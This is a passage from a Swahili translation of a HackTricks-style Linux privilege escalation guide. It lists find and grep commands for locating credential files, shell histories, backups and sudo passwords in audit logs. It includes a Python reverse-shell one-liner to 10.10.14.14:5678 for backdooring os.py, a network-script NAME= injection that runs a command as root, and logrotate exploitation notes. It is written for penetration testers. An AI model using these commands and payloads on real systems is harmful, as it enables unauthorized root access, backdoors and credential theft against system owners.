#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB faili
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Mafaili yaliyofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zenye passwords

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na passwords**.\
**Chombo kingine cha kuvutia** ambacho unaweza kutumia ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata passwords nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **taarifa za kuvutia/za siri ndani yake**. Kadri log itakavyokuwa ya ajabu zaidi, ndivyo itakavyo kuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya "**mbaya**" configured (backdoored?) **audit logs** zinaweza kukuruhusu **kuandika passwords** ndani ya audit logs kama ilivyoelezwa kwenye chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs kikundi** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zilizo na neno "**password**" katika **jina** lake au ndani ya **content**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya haya yote lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **from where** script ya python itatekelezwa na unaweza **can write inside** folda hiyo au unaweza **modify python libraries**, unaweza kubadilisha OS library na kuiweka backdoor (ikiwa unaweza kuandika mahali script ya python itatekelezwa, copy and paste maktaba os.py).

Ili **backdoor the library** ongeza tu mwishoni mwa os.py library mstari ufuatao (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` unampa mtumiaji aliye na **write permissions** kwenye faili la log au kwenye direktorii zake za mzazi uwezekano wa kupata escalated privileges. Hii ni kwa sababu `logrotate`, mara nyingi ikiendeshwa kama **root**, inaweza kudhibitiwa ili kutekeleza faili yoyote, hasa katika direktorii kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu kwenye _/var/log_ bali pia kwenye direktorii yoyote ambapo log rotation inatumika.

> [!TIP]
> Udhaifu huu unaathiri `logrotate` version `3.18.0` na zile za zamani

Maelezo zaidi kuhusu udhaifu yanaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua kwamba unaweza kubadilisha logs, angalia nani anasimamia logs hizo na uangalie kama unaweza escalate privileges kwa kubadilisha logs kuwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **write** script ya `ifcf-<whatever>` hadi _/etc/sysconfig/network-scripts_ **or** anaweza **adjust** ile iliyopo, basi **system is pwned**.

Network scripts, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinatoa muonekano sawa na faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` iliyowekwa katika network scripts hizi haiendeshwi kikamilifu. Ikiwa una nafasi nyeupe/tupu ndani ya jina mfumo unajaribu kutekeleza sehemu iliyofuata baada ya nafasi hiyo. Hii inamaanisha kwamba **everything after the first blank space is executed as root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa kawaida wa usimamizi wa huduma za Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kuendeshwa moja kwa moja au kupitia symbolic links zilizopo katika `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **service management** uliowasilishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mabadiliko kwenda Upstart, script za SysVinit bado zinatumika pamoja na usanidi wa Upstart kutokana na tabaka la utangamano ndani ya Upstart.

**systemd** inatokea kama initializer na service manager ya kisasa, ikitoa vipengele vya juu kama kuanzisha daemons kwa mahitaji, usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa packages za distribution na `/etc/systemd/system/` kwa marekebisho ya msimamizi, ikorahisisha mchakato wa utawala wa mfumo.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua uwezo wa kernel wenye vibali kwa manager wa userspace. Uthibitishaji dhaifu wa manager (mfano, signature checks kutokana na FD-order au mipangilio duni ya nywila) unaweza kumruhusu app ya eneo la ndani kujifanya manager na kupandisha hadhi hadi root kwenye vifaa ambavyo tayari vime-root. Jifunze zaidi na maelezo ya exploit hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
